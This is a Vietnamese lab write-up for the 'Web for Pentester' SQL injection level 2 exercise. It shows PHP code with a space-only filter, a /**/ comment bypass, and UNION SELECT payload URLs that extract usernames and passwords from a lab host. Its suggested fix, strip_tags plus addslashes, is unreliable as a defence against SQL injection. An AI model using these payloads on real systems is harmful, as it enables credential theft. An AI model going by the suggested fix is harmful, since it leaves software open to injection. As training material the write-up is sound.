#Level 2 Web for Pentes
Khi ta thử tiêm các đoạn code SQL injection vào thì sẽ báo lỗi như sau:
![text](http://i.imgur.com/g550I0d.png)

Báo lỗi `ERROR NO SPACE` là do đâu, trước hết xem đoạn code mà các lập trình viên dùng:
```sh
<?php
    ... ...
  if (preg_match('/\s+/', $_GET["name"])) {
      die("ERROR NO SPACE");   
  }
  $sql = "SELECT * FROM users where name='";
  $sql .= $_GET["name"]."'";

  $result = mysql_query($sql);
  ... ...
?>
```

--> Qua đó ta thấy rằng đoạn code mà lập trình viên nhập đã ngăn chặn những khoảng trắng mà người dùng nhập vào.

-->Cách xử lý ta có thể không cần dùng những khoảng trắng mà thay vào đó là sử dụng các kí tự có tác dụng tương tự khác như  `/**/` hoặc `TAB/HT (%09, URL encoded)` để Thực hiện bypass.

-Thử như sau cũng đoạn code tiêm nhưng ta sẽ thay các dấu space bằng các kí tự /**/: `http://192.168.215.142/sqli/example2.php?name=root%27/**/or/**/%271%27=%271` ta sẽ thu được

![text](http://i.imgur.com/mQv8IhG.png)

-Nhưng với kết quả này ta không thu được password. 

-Để lấy được password Ta tiêm vào url như sau:
```sh
192.168.215.142/sqli/example2.php?name=root'/**/union/**/select/**/1,(select/**/name/**/from/**/users/**/limit/**/3,1),(select/**/passwd/**/from/**/users/**/limit/**/3,1),4,5'
```

-Lấy name từ cột số 2
-Lấy pass từ cột số 3
 
 -Sử dụng limit để giới hạn trả về và ta thu được kết quả:

 ![text](http://i.imgur.com/37Ke8kA.png)

#Cách khắc phục:
-Sử dụng `strip_tags` và `addslashes` trước mỗi dòng truy vấn username và password vào để làm sạch thông tin, xóa bỏ các tag html, ký tự đặc biệt mà người dùng cố tình thêm vào để tấn công theo phương thức sql injection.

#CODE mô phỏng và fix lỗi
-DEMO lỗi : [DEMO](http://www.vanlan12.esy.es/NOTFIX/login.php)

-FIX lỗi: [FIX](http://www.vanlan12.esy.es/FIX/login.php)




